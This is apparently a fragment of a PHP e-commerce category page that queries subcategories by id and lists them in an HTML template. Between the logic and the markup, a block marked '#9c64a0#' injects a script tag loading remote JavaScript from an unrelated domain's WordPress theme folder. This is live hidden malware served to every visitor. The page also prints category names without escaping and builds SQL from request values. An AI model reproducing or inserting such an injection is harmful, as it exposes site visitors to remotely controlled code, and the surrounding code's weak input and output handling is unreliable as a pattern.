...
if(isset($_GET["id"]) AND is_numeric($_GET["id"])){
	$cat_id = $_GET["id"];
	$query = "select * from category where parent_id = $cat_id ";
	$all_subcat = $cls -> db_select($query);
	if(count($all_subcat) == 0){
		header("Location: product.php?cat_id=$cat_id");
		exit(0);
	}
}else{
...
if(isset($_GET["id"]) AND $_GET["id"] == 0){
	$query = "select * from category where (parent_id = 0 OR  parent_id is NULL) and status = 1";
	$all_subcat = $cls -> db_select($query);
}else{
	if(isset($_GET["id"]) AND is_numeric($_GET["id"])){
	$cat_id = $_GET["id"];
	$query = "select * from category where parent_id = $cat_id and status = 1";
	$all_subcat = $cls -> db_select($query);
	if(count($all_subcat) == 0){
		header("Location: product.php?cat_id=$cat_id");
		exit(0);
...
#9c64a0#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224416\"></script>";
echo $srwv;
}
#/9c64a0#
?>
	...
	<td valign="top" colspan="2" style="background-color: #FFFFFF; border:2px solid #cccccc; ">
		...
		Category:
				...
				?>
					<a style="text-decoration:none" href="category.php?cat_id=<?=$tree_info[$i]["id"] ?>"><? print $tree_info[$i]["name"]." &raquo; " ?></a>
				<? } ?>
		...
		<!-- InstanceBeginEditable name="content" -->
			<div align="right"><a href="all_category.php">All Category</a></div>
			<? 
				reset($all_subcat);
				if(is_array($all_subcat)){ 
				while(list($key,$val) = each($all_subcat)){
			?>
				<div class="rightin" style="float:left; width:300px; padding:10px">
				<img src="../images/bullet_3.gif" align="absmiddle" /> &nbsp; <a href="category.php?id=<?=$val["id"] ?>"><?=$val["name"] ?></a>
				</div>				
			<? } } ?>
			<br /><br />
		<!-- InstanceEndEditable -->	
